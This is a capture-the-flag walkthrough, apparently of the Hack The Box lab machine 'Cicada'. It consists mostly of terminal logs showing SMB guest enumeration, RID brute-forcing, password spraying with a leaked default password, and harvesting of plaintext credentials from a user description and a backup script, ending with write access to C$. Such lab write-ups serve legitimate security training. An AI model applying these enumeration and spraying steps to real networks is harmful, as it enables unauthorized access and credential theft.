
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u 'guest' -p '' --shares
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.169.79   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.169.79   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.169.79   445    CICADA-DC        -----           -----------     ------
SMB         10.129.169.79   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.169.79   445    CICADA-DC        C$                              Default share
SMB         10.129.169.79   445    CICADA-DC        DEV                             
SMB         10.129.169.79   445    CICADA-DC        HR              READ            
SMB         10.129.169.79   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.169.79   445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.169.79   445    CICADA-DC        SYSVOL                          Logon server share 
```
null session didn't work but typing anything as user did - we have read on HR

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ smbget --recursive smb://10.129.169.79/DEV 
Password for [WORKGROUP\fixit42]:
Using domain: WORKGROUP, user: fixit42
Can't open directory smb://10.129.169.79/DEV: Permission denied
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ smbget --recursive smb://10.129.169.79/HR                             
Password for [WORKGROUP\fixit42]:
Using domain: WORKGROUP, user: fixit42
smb://10.129.169.79/HR/Notice from HR.txt                                                                                     
Downloaded 1.24kB in 2 seconds
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ ls -la          
total 12
drwxrwxr-x  2 fixit42 fixit42 4096 Jul 31 18:38  .
drwxr-xr-x 12 fixit42 fixit42 4096 Jul 31 18:15  ..
-rwxr-xr-x  1 fixit42 fixit42 1266 Jul 31 18:38 'Notice from HR.txt'
```

```
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ cat Notice\ from\ HR.txt  

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u 'guest' -p '' --rid-brute
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.169.79   445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.169.79   445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.169.79   445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.169.79   445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.169.79   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.169.79   445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.169.79   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

SMB         10.129.169.79   445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)

SMB         10.129.169.79   445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)

SMB         10.129.169.79   445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.169.79   445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

---

we've got a starndard password and five usernames
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u usernames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.169.79   445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.169.79   445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
SMB         10.129.169.79   445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
```
one user found
`michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`

---

let's try out new creds
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.169.79   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.169.79   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.169.79   445    CICADA-DC        -----           -----------     ------
SMB         10.129.169.79   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.169.79   445    CICADA-DC        C$                              Default share
SMB         10.129.169.79   445    CICADA-DC        DEV                             
SMB         10.129.169.79   445    CICADA-DC        HR              READ            
SMB         10.129.169.79   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.169.79   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.169.79   445    CICADA-DC        SYSVOL          READ            Logon server share 
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users                        
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.169.79   445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-   
SMB         10.129.169.79   445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain                                                                                        
SMB         10.129.169.79   445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain                                                                                      
SMB         10.129.169.79   445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account                                                                                                       
SMB         10.129.169.79   445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2        
SMB         10.129.169.79   445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 2        
SMB         10.129.169.79   445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.169.79   445    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                                           
SMB         10.129.169.79   445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1        
SMB         10.129.169.79   445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```
we got another user
`david.orelious:aRt$Lp#7t*VQ!3`

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.169.79   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.169.79   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.169.79   445    CICADA-DC        -----           -----------     ------
SMB         10.129.169.79   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.169.79   445    CICADA-DC        C$                              Default share
SMB         10.129.169.79   445    CICADA-DC        DEV             READ            
SMB         10.129.169.79   445    CICADA-DC        HR              READ            
SMB         10.129.169.79   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.169.79   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.169.79   445    CICADA-DC        SYSVOL          READ            Logon server share 
```
ah, finally read on dev!

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ smbget --user='david.orelious' --password='aRt$Lp#7t*VQ!3' --recursive smb://10.129.169.79/dev
Using domain: WORKGROUP, user: david.orelious
Using domain: WORKGROUP, user: david.orelious
smb://10.129.169.79/dev/Backup_script.ps1                                                                                     
Downloaded 601b in 1 seconds
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ ls -la
total 20
drwxrwxr-x  2 fixit42 fixit42 4096 Jul 31 19:55  .
drwxr-xr-x 12 fixit42 fixit42 4096 Jul 31 18:15  ..
-rwxr-xr-x  1 fixit42 fixit42  601 Jul 31 19:55  Backup_script.ps1
-rwxr-xr-x  1 fixit42 fixit42 1266 Jul 31 18:38 'Notice from HR.txt'
-rw-rw-r--  1 fixit42 fixit42   75 Jul 31 19:27  usernames.txt
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ cat Backup_script.ps1   

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
oh, another user again
`emily.oscars:Q!3@Lp#M6b*7t*Vt`

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares   
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
SMB         10.129.169.79   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.169.79   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.169.79   445    CICADA-DC        -----           -----------     ------
SMB         10.129.169.79   445    CICADA-DC        ADMIN$          READ            Remote Admin
SMB         10.129.169.79   445    CICADA-DC        C$              READ,WRITE      Default share
SMB         10.129.169.79   445    CICADA-DC        DEV                             
SMB         10.129.169.79   445    CICADA-DC        HR              READ            
SMB         10.129.169.79   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.169.79   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.169.79   445    CICADA-DC        SYSVOL          READ            Logon server share 
```
woo, read/write on c$! we need to know more about this user!

